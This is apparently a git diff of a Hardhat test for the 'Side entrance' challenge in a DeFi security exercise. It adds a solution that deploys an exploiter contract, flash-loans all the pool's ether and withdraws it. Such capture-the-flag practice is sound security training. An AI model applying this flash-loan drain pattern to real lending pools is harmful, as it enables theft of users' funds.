@@ -1,5 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { hexStripZeros } = require('@ethersproject/bytes');
 
 describe('[Challenge] Side entrance', function () {
 
@@ -21,10 +22,18 @@ describe('[Challenge] Side entrance', function () {
         expect(
             await ethers.provider.getBalance(this.pool.address)
         ).to.equal(ETHER_IN_POOL);
+        
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const Exploiter = await ethers.getContractFactory('FlashLoanEtherReceiver', attacker) ;
+        var exploiter = await Exploiter.deploy(this.pool.address);
+        await exploiter.connect(attacker).flashloan(ETHER_IN_POOL);
+        console.log(exploiter.address)
+        console.log(deployer.address)
+        console.log("balance of exploiter", await this.pool.balances(exploiter.address));
+        await exploiter.connect(attacker).withdraw();
     });
 
     after(async function () {
